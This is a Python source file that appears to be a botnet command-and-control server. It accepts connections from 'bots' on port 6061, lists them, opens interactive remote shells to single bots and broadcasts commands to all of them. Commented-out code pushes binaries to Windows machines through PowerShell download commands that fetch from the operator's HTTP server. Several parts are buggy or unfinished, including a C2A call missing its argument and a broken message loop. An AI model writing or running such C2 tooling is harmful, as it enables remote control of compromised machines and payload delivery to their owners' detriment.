import socket
import threading
import os, subprocess
import time
os.chdir(os.path.abspath('/tmp/'))
import requests

bots=[]

port = 6061
debug = 0

"""
Start listening
"""
def start_listing(port):
    print("Server listening on port "+str(port))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(("", port))
    sock.listen(2)
    sock.settimeout(2)
    return sock

# """
# Receive buffers
# """
# def get_message(conn):
#     print("get_message started")
#     while True:
#         try:
#             data = conn.recv(6282).decode()
#             if len(data) != 0:
#                 print(data[:-1])
#         except:
#             # todo - errors
#             pass
#
# def send_message(conn):
#     print("send_message started")
#     while True:
#         try:
#             message = input(">").strip("\n")
#             message = message + "\r\n"
#             # end shell mode
#             if message == "exit":
#                 break
#             if len(message) != 0:
#                 conn.send(message.encode('utf-8'))
#         except:
#             # todo - errors
#             pass

def execute_command(command):
    if len(command) > 0:
        print(command)
        proc = subprocess.Popen(command.split(" "), stdout=subprocess.PIPE)
        return proc

def getIP():
    ip = requests.session().get("http://httpbin.org/ip").text.split(":")[1].split('"')[1]
    print(ip)
    return
    pass

# def upload_binary(bot):
#     #Setup
#     conn = bot[0]
#     addr = bot[1]
#     ip = conn.getpeername()[0]
#     port = conn.getpeername()[1]
#     # ask for the file location
#     binLocation = s_input("Binary? (Absolute path) Ex: /root/winbin/wget.exe")
#     # ask for an ip
#     lhost = s_input("Local host? [0.0.0.0]")
#     # copy the file to tmp.
#     execute_command("cp "+binLocation+" /tmp/")
#     # proc is needed to kill it after the upload process
#     # This http server is at /tmp
#     proc = execute_command("python -m SimpleHTTPServer 8080")
#     #out, err = proc.communicate()
#     location = binLocation.split("/")
#     filename = location[-1]
#     #command = "PowerShell (New-Object System.Net.WebClient).DownloadFile('http://"+lhost+":8080/"+filename+"','"+filename+"');"
#     #command = "PowerShell Invoke-WebRequest 'http://"+lhost+":8080/"+filename+"' -OutFile ‘C:\wget.exe’"
#     # Send and print the outputs
#     print("Uploading ..")
#     try:
#         conn.settimeout(2)
#         conn.send(command.encode('utf-8'))
#         conn.recv(6282)
#         conn.recv(6282)
#     except:
#         if debug:
#             print("Failed!")
#         pass
#     proc.kill()
#     pass

def send_message(bot):
    #Setup
    conn = bot[0]
    addr = bot[1]
    ip = conn.getpeername()[0]
    port = conn.getpeername()[1]

    print("send_message started")
    while True:
        try:
            message = input("").split("\n")
            # end shell mode
            if message == "exit shell":
                break
            message = message + "\r\n"
            if len(message) != 0:
                conn.send(message.encode('utf-8'))
        except:
            # todo - errors
            pass

"""
Send one command and recv "r_buffer" size of buffer.
"""
def SR(command,conn,r_buffer):
    conn.send(command.encode('utf-8'))
    return conn.recv(r_buffer)

def C2A(command):
    Command = s_input("C2A:~")
    if Command == "exit":
        return
    condition = s_input("Do you want to send ->'"+Command+"' to all bots? [y/N]")
    if condition == "y" or condition == "Y":
        command = command + "\r\n"
        for bot in bots:
            addr = bot[1]
            conn = bot[0]
            ip = addr[0]
            port = addr[1]
            try:
                SR(command,conn,6282)
                print(str(ip)+" Received")
            except:
                if debug:
                    print("Error at one2all(command) when sending to "+str(ip))
    else:
        return

"""
Start shell mode
"""
def talk(bot):
    #Setup
    conn = bot[0]
    addr = bot[1]
    ip = conn.getpeername()[0]
    port = conn.getpeername()[1]

    send_message_thread = threading.Thread(target=send_message, args=(bot,))
    send_message_thread.daemon = True
    send_message_thread.start()
    conn.settimeout(2)
    while send_message_thread.isAlive():
        try:
            data = conn.recv(6282).decode().strip("\n")[:-1]
            if len(data) != 0:
                print(data)
        except:
            pass


def s_input(string):
    return input("["+string+"]>").strip("\n")

"""
print all bots
"""
def list():
    #[conn, addr]
    for bot in bots:
        addr = bot[1]
        conn = bot[0]
        ip = addr[0]
        port = addr[1]
        print(str(ip)+" at "+str(port))

"""
Stop
"""
def kill_all():
    for bot in bots:
        print(bot)

"""
Find a match
"""
def find_bot(name):
    for bot in bots:
        ip = bot[0].getpeername()[0]
        if name == ip:
            return bot
    return []

def console():
    while 1:
        Command = s_input("MB:~")
        if len(Command) <= 0:
            continue
        bot = find_bot(Command)
        if len(bot) >= 2:
            talk(bot)
            continue
        elif Command == "list":
            list()
        # Send a command to all bots
        elif Command == "C2A":
            C2A()
        # Send a binary to all bots
        elif Command == "B2A":
            pass
        elif Command == "C2I":
            pass
        elif Command == "B2I":
            list()
            name = s_input("Who?")
            bot = find_bot(name)
            #upload_binary(bot)
        elif Command == "exit":
            break
        else:
            pass

def main():
    global bots
    sock = start_listing(port)
    consoleT = threading.Thread(target=console, args=())
    consoleT.daemon = True
    consoleT.start()

    while consoleT.isAlive():
        try:
            conn, addr = sock.accept()
            print("\n"+str(addr[0])+":"+str(addr[1])+" has connected")
            bots.append([conn, addr])
        except:
            pass
    sock.close()

if __name__ == '__main__':
    pass
    #getIP()
    main()
